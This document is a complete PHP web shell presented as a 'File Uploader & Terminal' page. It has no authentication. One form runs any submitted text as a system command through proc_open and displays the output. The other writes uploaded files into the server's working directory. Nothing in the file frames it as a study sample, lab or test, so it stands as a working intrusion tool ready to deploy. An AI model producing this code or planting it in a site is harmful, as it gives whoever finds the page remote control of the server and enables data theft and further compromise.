<?php

class FileUploader {
    private $destinationFolder;

    public function __construct($destinationFolder = null) {
        $this->destinationFolder = $destinationFolder !== null ? $destinationFolder : getcwd();
    }

    public function handleUpload($file, $key) {
        if ($key === 'upload') {
            if ($this->isValidFile($file)) {
                $destination = $this->getDestinationPath($file['name']);
                if ($this->moveUploadedFile($file['tmp_name'], $destination)) {
                    echo "<b>File uploaded to: {$destination}</b>";
                } else {
                    echo "<b>File upload failed</b>";
                }
            } else {
                echo "Error: " . $file['error'];
            }
        }
    }

    private function isValidFile($file) {
        return isset($file) && isset($file['error']) && $file['error'] === UPLOAD_ERR_OK;
    }

    private function getDestinationPath($fileName) {
        $sanitizedFileName = basename($fileName);
        return rtrim($this->destinationFolder, '/') . '/' . $sanitizedFileName;
    }

    private function moveUploadedFile($tmpName, $destination) {
        if (function_exists('move_uploaded_file')) {
            return move_uploaded_file($tmpName, $destination);
        } else {
            return rename($tmpName, $destination);
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['k'])) {
    $uploader = new FileUploader();
    if (isset($_FILES['f'])) {
        $uploader->handleUpload($_FILES['f'], $_POST['k']);
    } else {
        echo "No file uploaded.";
    }
}

if (isset($_POST['submit']) && isset($_POST['command'])) {
    $command = $_POST['command'];
    echo "<h2>Execution Result:</h2>";

    $descriptors = array(
        0 => array("pipe", "r"), 
        1 => array("pipe", "w"), 
        2 => array("pipe", "w"), 
    );

    $process = proc_open($command, $descriptors, $pipes);

    if (is_resource($process)) {
        fwrite($pipes[0], "y\n");
        fclose($pipes[0]);
        $output = stream_get_contents($pipes[1]);
        $error = stream_get_contents($pipes[2]);

        fclose($pipes[1]);
        fclose($pipes[2]);

        $status = proc_close($process);

        echo "<pre>$output</pre>";
        if ($error) {
            echo "<pre style='color:red;'>$error</pre>";
        }
    } else {
        echo "Failed to open process.";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Uploader & Terminal</title>
</head>
<body>
<h1>Execute Command</h1>
    <form id="terminalForm" method="post" action="">
        <label for="command">Enter terminal command:</label><br>
        <input type="text" name="command" id="command" autocomplete="off" required><br><br>
        <input type="submit" name="submit" value="Run">
    </form>

<h1>File Uploader</h1>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="f">
    <input name="k" type="submit" value="upload">
</form>

</body>
</html>
